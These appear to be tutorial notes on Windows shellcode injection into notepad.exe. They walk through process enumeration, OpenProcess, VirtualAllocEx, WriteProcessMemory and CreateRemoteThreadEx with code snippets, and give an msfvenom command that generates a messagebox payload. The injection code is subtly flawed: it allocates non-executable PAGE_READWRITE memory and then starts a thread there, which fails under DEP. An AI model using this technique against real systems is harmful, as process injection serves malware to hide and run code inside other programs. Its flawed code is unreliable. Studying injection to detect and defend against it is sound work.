NECESSARY FUNCTIONS FOR PROCESS INJECTION
-------------------------------------------
If we are going to work with #include <tlhelp32.h>, we will use:

CreateToolhelp32Snapshot — to take a snapshot of the processes.

Process32First — to retrieve info about the first process.

Process32Next — to iterate over remaining processes.

OpenProcess — to get a handle to the target process.

VirtualAllocEx — to allocate memory in the target process.

WriteProcessMemory — to inject shellcode.

CreateRemoteThreadEx — to execute the shellcode.

SNAPSHOT CREATION & PROCESS ITERATION
-------------------------------------
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

This calls a Windows API function to create a snapshot of all currently running processes in the system.

- TH32CS_SNAPPROCESS: tells Windows you want to take a snapshot of the process list.
- 0: means "give me all processes" 
  (the second parameter can specify a specific PID if you're taking snapshots of threads or modules, but for processes, it's always 0).

CreateToolhelp32Snapshot() returns a HANDLE — basically a reference to a kernel object.

That handle lets you iterate through the list of processes using:

    Process32First(snapshot, &pe32);
    Process32Next(snapshot, &pe32);

These functions fill in the pe32 structure with info about each process: PID, exe name, parent PID, etc.

PROCESS32FIRST & PROCESS32NEXT
-------------------------------
Process32First() and Process32Next() are used to retrieve information about processes in the system.
- Process32First() retrieves information about the first process in the snapshot.
- Process32Next() retrieves information about the next process in the snapshot.
- Both functions fill a PROCESSENTRY32 structure with details about the process, such as its ID, name, and other attributes.
  BOOL Process32First(
  [in]      HANDLE           hSnapshot, //A handle to the snapshot returned from a previous call to the CreateToolhelp32Snapshot function.
  [in, out] LPPROCESSENTRY32 lppe //A pointer to a PROCESSENTRY32 structure. It contains process information

); 
exsample:
Process32First(hSnapshot, &pe32);

PROCESSENTRY32 STRUCTURE & SIZE
-------------------------------
pe32.dwSize = sizeof(PROCESSENTRY32);

How is the sizeof calculated?
sizeof is a compile-time operator.  
It returns the total number of bytes occupied by the type PROCESSENTRY32.

This structure is defined as:
typedef struct tagPROCESSENTRY32 {
    DWORD dwSize; // Size of the structure, must be set before calling Process32First or Process32Next
    DWORD cntUsage; // Count of times the process is used (not always relevant)
    DWORD th32ProcessID; // Unique identifier for the process 
    ULONG_PTR th32DefaultHeapID; // Default heap ID for the process
    DWORD th32ModuleID; 
    DWORD cntThreads; // Number of threads in the process
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    TCHAR szExeFile[MAX_PATH]; // Name of the executable file for the process
} PROCESSENTRY32;

So sizeof(PROCESSENTRY32) will compute the total size of all those fields.

COMPARING PROCESS NAMES
-----------------------------
here we will be using wcscmp() to compare the process name with a target name.
int wcscmp(
   const wchar_t *string1,
   const wchar_t *string2
);
- wcscmp() compares two wide-character strings.
- It returns 0 if the strings are equal, a negative value if string1 is less than string2, and a positive value if string1 is greater than string2.
- In our case, we use it to check if the process name matches "notepad.exe" (or any other target process name).
- If the comparison returns 0, it means the process name matches, and we can proceed

exsample:
if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
    // Process name matches, proceed with injection
}

OPENING A PROCESS
-----------------
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,   // Specifies the access rights requested for the process (e.g., read, write, terminate).
  [in] BOOL  bInheritHandle,    // If TRUE, the returned handle can be inherited by child processes; if FALSE, it cannot.
  [in] DWORD dwProcessId        // The unique identifier (ID) of the process to open.
);

- If the function succeeds, the return value is an open handle to the specified process.
- If the function fails, the return value is NULL.
exsample:
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS, // Requesting all access rights
    FALSE,              // Handle cannot be inherited
    pe32.th32ProcessID  // Process ID of the target process
);
if (hProcess == NULL) {
    error("Failed to open process: %lu", GetLastError());
    return EXIT_FAILURE;
} else {
    okay("Successfully opened process with PID %lu", pe32.th32ProcessID);
}

MEMORY ALLOCATION IN REMOTE PROCESS
-----------------------------------
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,         // Handle to the process where memory will be allocated.
  [in, optional] LPVOID lpAddress,        // Starting address for the allocation. If NULL, the system picks.
  [in]           SIZE_T dwSize,           // Size of the memory block to allocate.
  [in]           DWORD  flAllocationType, // Type of allocation (e.g., MEM_COMMIT).
  [in]           DWORD  flProtect         // Memory protection (e.g., PAGE_READWRITE).
);

- If the function succeeds, the return value is a pointer to the allocated memory.
- If the function fails, the return value is NULL.
exsample:
rAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (rAlloc_mem == NULL) {
    error("Failed to allocate memory in target process: %lu", GetLastError());
    return EXIT_FAILURE;
} else {
    okay("Successfully allocated memory in target process at address %p", rAlloc_mem);
}

WRITING SHELLCODE INTO PROCESS MEMORY
-------------------------------------
BOOL WriteProcessMemory(
  [in] HANDLE hProcess,
  [in] LPVOID lpBaseAddress,
  [in] LPCVOID lpBuffer,
  [in] SIZE_T nSize,
  [out, optional] SIZE_T *lpNumberOfBytesWritten
);

Example:
```c
  if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode), NULL)) {
      okay("Successfully wrote to process memory");
  } else {
      error("Failed to write to process memory: %lu", GetLastError());
      return EXIT_FAILURE;
  }

CREATING A REMOTE THREAD
-------------------------
CreateRemoteThreadEx(
[in] HANDLE hProcess,
[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes,
[in] SIZE_T dwStackSize,
[in] LPTHREAD_START_ROUTINE lpStartAddress,
[in, optional] LPVOID lpParameter,
[in] DWORD dwCreationFlags,
[out, optional] LPDWORD lpThreadId
);

Example:
  HANDLE hThread = CreateRemoteThreadEx(
      hProcess, 
      NULL, 
      0, 
      (LPTHREAD_START_ROUTINE)rAlloc_mem, 
      NULL, 
      0, 
      NULL
  );

  if (hThread == NULL) {
      error("Failed to create remote thread: %lu", GetLastError());
      return EXIT_FAILURE;
  } else {
      okay("Successfully created remote thread");
  }
GENERATING SHELLCODE (KALI)
----------------------------
msfvenom -p windows/x64/messagebox TEXT="I Licked Herta" TITLE="Injected" -f c --var-name=ShellCode

FINDING PROCESS ID (PID) OF NOTEPAD
------------------------------------
PS> notepad
PS> tasklist | findstr /i notepad

tasklist lists all the processes.

findstr /i notepad filters the list for the notepad process.

If notepad is running, the output will look like:
Notepad.exe                  22248 Console                    1   101 888 Ko

